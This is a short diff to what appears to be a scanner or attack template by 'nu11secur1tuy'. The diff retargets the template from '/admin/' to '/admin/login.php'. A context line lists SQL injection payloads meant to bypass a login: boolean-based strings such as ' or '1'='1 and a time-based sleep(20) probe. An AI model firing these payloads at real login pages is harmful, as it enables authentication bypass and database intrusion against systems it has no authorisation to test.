@@ -5,7 +5,7 @@ metadata:
     author: "nu11secur1tuy"
 
 define:
-    potential_path = "/admin/"
+    potential_path = "/admin/login.php"
 
 run for each:
     puncher = "'+OR+1=1--","'+(select*from(select(sleep(20)))a)+'","' or '1'='1","'nu11secur1ty' or 1=1#"
